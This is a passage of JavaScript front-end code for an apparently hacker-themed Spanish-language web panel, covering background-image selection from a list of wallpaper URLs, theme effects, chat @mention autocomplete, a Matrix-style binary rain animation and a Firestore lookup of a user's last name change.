    "https://i.postimg.cc/y8TwV767/360-F-608789044-me2Pt-F6ogx-ZKxd-Vzr-Blmt2ZYq-Mo-Z5z0E.jpg",
    "https://i.postimg.cc/wTg29L1x/36e29fb333167866e9f4961fd686cc6a.jpg",
    "https://i.postimg.cc/7ZpTZrK5/46c72b16317fef529fa5595143f6e8bc.jpg",
    "https://i.postimg.cc/90W9HPJK/4b77e726b288a4d816cb2e3c194b8954.jpg",
    "https://i.postimg.cc/TwvmCvmP/54006b42e589a12e78abd06ac6550805.jpg",
    "https://i.postimg.cc/YCSxW7fB/56eebd8d4ff4117b40cc8b38d6383378.jpg",
    "https://i.postimg.cc/0yrpNfPg/596ab1abdadd14f5d4b159256b8dce41.jpg",
    "https://i.postimg.cc/BQBhFNrX/5b3bfd4d477b5d3768c39bd7d721d16c.jpg",
    "https://i.postimg.cc/bYTbHMvY/5de38645b8a8a7edbf104a4cf3b967be.jpg",
    "https://i.postimg.cc/44M2Zmzs/79065a72faea7decf81ebd10de644c32.jpg",
    "https://i.postimg.cc/HnByYJNb/7cca66e6bc4a1ba447e7819463202526.jpg",
    "https://i.postimg.cc/5tTpJrzd/a0808bb2f535b0b544f7725ebc2cb13b.jpg",
    "https://i.postimg.cc/PrSWhcGC/a5cc22c43642ee40a75665208c8d388d.jpg",
    "https://i.postimg.cc/5Ng3yyzq/Anonymous-Earth-iPhone-Wallpaper-4K.jpg",
    "https://i.postimg.cc/k4NSHYFN/c0de7e8eab6a3d39238d36732ada3ade.jpg",
    "https://i.postimg.cc/FzgxjsnW/c6d8a194464d693fd533fd10500781e7.jpg",
    "https://i.postimg.cc/DfdQp0xf/cfd6c4a02a9237921c1d1c414c831031.jpg",
    "https://i.postimg.cc/FHGnMGGm/concepto-de-seguridad-hacker-sin-rostro-en-el-trabajo-con-la-inscripcion-pirateria-et.jpg",
    "https://i.postimg.cc/ZnhcByjC/d69d3152570a367eecb6ca3b52cdf720.jpg",
    "https://i.postimg.cc/G3sV4F3Q/depositphotos-710393540-stock-photo-faceless-hacker-hacking-inscription-binary.webp",
    "https://i.postimg.cc/VvRjJZJ0/desktop-wallpaper-guy-fawkes-mask-anon-mask.jpg",
    "https://i.postimg.cc/WpMSRXb8/desktop-wallpaper-iphone-for-iphone-8-iphone-8-plus-iphone-6s-iphone-6s-plus-iphone-x-and-ipod-touch.jpg",
    "https://i.postimg.cc/d0yr2Vhf/e83ca84415892f958189823dbf647e34.jpg",
    "https://i.postimg.cc/K8Vt3M8B/fbc0925ccbc21d2bfa35fe57d606a528.jpg",
    "https://i.postimg.cc/tTJDGjVv/fondo-de-codigo-verde-pirateria-en-curso.jpg",
    "https://i.postimg.cc/2SNHbMcH/G6ba-Fm.jpg",
    "https://i.postimg.cc/Y9vVfg1X/hacker-g1e3a44200-1920-b6ba00f811758a41c98bff2db4b9e3e4-2000.jpg",
    "https://i.postimg.cc/HxFNSxz5/hacker-group-names-are-now-absurdly-out-of-control-v0-e5o1bw2DPr666vpx8NI3CZm-BCo-ESLyjff-QOo-Kn-N-k.jpg",
    "https://i.postimg.cc/FzcBw4CG/hacking-ciberseguridad.jpg",
    "https://i.postimg.cc/4dpvgxZJ/HD-wallpaper-anonymous-hack.jpg",
    "https://i.postimg.cc/6qwr5x5m/HD-wallpaper-anonymous-mask-smoke-iphone-iphone-iphone.jpg",
    "https://i.postimg.cc/jqN3xRv8/HD-wallpaper-kali-linux-neon-kali-linux-neon-thumbnail.jpg",
    "https://i.postimg.cc/GhC796Sf/images-r-bCqBCLR5XiHul6s3TDDxD71QMB273IbthMfxg75k8GkKqBTmzDOYA5YujiWfmd3yjPBGAyVPn6LJDQe.webp",
    "https://i.postimg.cc/KYRQdbRr/kali-linux-neon-dragon-968bqdlzy2n7tfu3.webp",
    "https://i.postimg.cc/90GLJBr3/kali-linux-silver-dragon-vj6bgoy7ysr3s6ag.jpg",
    "https://i.postimg.cc/vHrKzGVy/pngtree-security-concept-lock-on-digital-screen-locks-hacker-protection-photo-picture-image-6526616.png",
    "https://i.postimg.cc/jC0hfnXc/the-anonymus-guy-lb.jpg",
    "https://i.postimg.cc/Y9Lnm774/wired-placeholder-dummy.jpg",
    "https://i.postimg.cc/Jz7p5Z8x/wp13404605.jpg",
    "https://i.postimg.cc/KY67wMXb/wp14671539.jpg",
    "https://i.postimg.cc/6pVMdcFT/wp2697320.jpg"
];

window.cambiarFondoMenu = () => {
    const cont  = $id("imagenesFondoMenuLateral");
    const lista = $id("imagenesMenuLateralLista");
    cont.style.display = cont.style.display === "block" ? "none" : "block";
    if (cont.style.display === "block" && lista.innerHTML === "") {
        imagenesMenuLateral.forEach(img => {
            const el = document.createElement("img");
            el.src      = img;
            el.loading  = "lazy";
            el.style.cssText = "width:100%;height:auto;cursor:pointer;border:3px solid #0f0;border-radius:8px;margin:6px 0;box-shadow:0 0 15px #0f0;";
            el.onclick = () => {
                const panel = $id("panel");
                if (panel) {
                    const urlEscapada = img.replace(/\(/g, '%28').replace(/\)/g, '%29');
                    panel.style.backgroundImage    = `url(${urlEscapada})`;
                    panel.style.backgroundSize     = "cover";
                    panel.style.backgroundPosition = "center";
                    panel.style.backgroundRepeat   = "no-repeat";
                }
                localStorage.setItem("fondoMenuLateral", img);
                cont.style.display = "none";
                mostrarNotif("Fondo del menú lateral cambiado");
            };
            lista.appendChild(el);
        });
    }
};

function cargarFondoMenuLateralGuardado() {
    const fondoGuardado = localStorage.getItem("fondoMenuLateral");
    if (fondoGuardado) {
        const panel = $id("panel");
        if (panel) {
            panel.style.backgroundImage    = `url(${fondoGuardado})`;
            panel.style.backgroundSize     = "cover";
            panel.style.backgroundPosition = "center";
            panel.style.backgroundRepeat   = "no-repeat";
        }
    }
}
window.addEventListener("load", cargarFondoMenuLateralGuardado);

// ============================================================
//  TEMA 2 — EFECTOS VISUALES
// ============================================================
document.getElementById("btnTema2").onclick = function(e) {
    e.stopPropagation();
    const lista = $id("listaTema2");
    lista.style.display = lista.style.display === "block" ? "none" : "block";
};

document.querySelectorAll('.tema-opt').forEach(item => {
    item.onclick = function() {
        const efecto   = this.dataset.t;
        const selector = '.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatMessages,#chatInput,#chatUsuario,#acortador,.btn-copiar,#panel,#submenu > div,#registros,#ventanaAcortador,#ventanaMisEnlaces,#modalContent,#usuariosOnlineBox div,#btnMostrarAcortador,#acortadorBtn,.btn[onclick="copiarLink()"]';
        document.querySelectorAll(selector).forEach(el => {
            el.classList.remove(
                'tema-none','tema-matrix','tema-grid','tema-scan','tema-holo',
                'tema-transparent','tema-neon','tema-circuit','tema-glitch2',
                'tema-wave','tema-pulse','tema-hack','tema-darkspark','tema-neonglow',
                'tema-darkgrid','tema-darkpulse','tema-cyberspark','tema-darkglitch',
                'tema-darkwave','tema-darkscan','tema-darkholo','tema-darkcircuit'
            );
            el.classList.add('tema-' + efecto);
        });
        localStorage.setItem('tema2', efecto);
        $id("listaTema2").style.display = "none";
    };
});

const savedTema   = localStorage.getItem('tema2') || 'none';
const selectorT2  = '.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatMessages,#chatInput,#chatUsuario,#acortador,.btn-copiar,#panel,#submenu > div,#registros,#ventanaAcortador,#ventanaMisEnlaces,#modalContent,#usuariosOnlineBox div,#btnMostrarAcortador,#acortadorBtn,.btn[onclick="copiarLink()"]';
document.querySelectorAll(selectorT2).forEach(el => el.classList.add('tema-' + savedTema));

// ============================================================
//  MENCIONES @ — AUTOCOMPLETADO
// ============================================================
(function() {
    setTimeout(() => {
        const input     = $id("chatInput");
        const contenedor = document.querySelector(".chat-input-container");
        if (!input || !contenedor) return;
        contenedor.style.position = "relative";

        const lista = document.createElement("div");
        lista.style.cssText = "position:absolute;bottom:70px;left:10px;width:calc(100% - 20px);background:#000;border:2px solid #0f0;padding:10px;border-radius:8px;max-height:180px;overflow:auto;display:none;z-index:99999;box-shadow:0 0 30px #0f0;color:#0f0;font-family:monospace;";
        contenedor.appendChild(lista);

        let usuarios = new Set();

        function actualizarUsuarios() {
            usuarios.clear();
            document.querySelectorAll("#chatMessages div").forEach(d => {
                const txt = d.textContent;
                if (txt && txt.includes(":")) {
                    const nombre = txt.split(":")[0].trim();
                    if (nombre) usuarios.add(nombre);
                }
            });
        }

        input.addEventListener("input", () => {
            const v   = input.value;
            const pos = input.selectionStart;
            const arroba = v.lastIndexOf("@", pos - 1);
            if (arroba === -1) return lista.style.display = "none";
            const buscar  = v.slice(arroba + 1, pos).toLowerCase();
            const matches = [...usuarios].filter(u => u.toLowerCase().includes(buscar));
            if (!matches.length) return lista.style.display = "none";
            lista.innerHTML = "";
            matches.forEach(u => {
                const item = document.createElement("div");
                item.textContent  = u;
                item.style.cssText = "padding:8px;cursor:pointer;border-bottom:1px solid #0f0;";
                item.onmouseover  = () => { item.style.background = "#0f0"; item.style.color = "#000"; };
                item.onmouseout   = () => { item.style.background = "";     item.style.color = "#0f0"; };
                item.onclick      = () => {
                    input.value = v.slice(0, arroba) + "@" + u + " " + v.slice(pos);
                    lista.style.display = "none";
                    input.focus();
                };
                lista.appendChild(item);
            });
            lista.style.display = "block";
        });

        document.addEventListener("click", e => {
            if (!input.contains(e.target) && !lista.contains(e.target)) {
                lista.style.display = "none";
            }
        });

        setInterval(actualizarUsuarios, 2000);
        actualizarUsuarios();
    }, 2000);
})();

// ============================================================
//  LLUVIA BINARIA (MATRIX)
// ============================================================
function iniciarLluviaBinaria() {
    const canvas = $id("matrixCanvas");
    if (!canvas) return;
    const ctx    = canvas.getContext("2d");
    canvas.width  = window.innerWidth;
    canvas.height = window.innerHeight;

    const cols    = Math.floor(canvas.width / 16);
    const drops   = Array(cols).fill(1);
    let color     = "#00ff00";

    window.binarios = { color };

    function draw() {
        ctx.fillStyle = "rgba(0,0,0,0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = window.binarios.color || "#00ff00";
        ctx.font      = "14px monospace";
        drops.forEach((y, i) => {
            const text = Math.random() > 0.5 ? "1" : "0";
            ctx.fillText(text, i * 16, y * 16);
            if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }

    setInterval(draw, 50);

    window.addEventListener("resize", () => {
        canvas.width  = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

// ============================================================
//  CARGAR ÚLTIMO CAMBIO DE NOMBRE
// ============================================================
async function cargarUltimoCambioNombre() {
    try {
        const userRef  = doc(db, "panelUsers", miUserDocId);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists() && userSnap.data().ultimoCambioNombre) {
            ultimoCambioNombre = userSnap.data().ultimoCambioNombre.toMillis();
        }
    } catch (e) {
        console.error("Error al cargar último cambio de nombre:", e);
    }
}
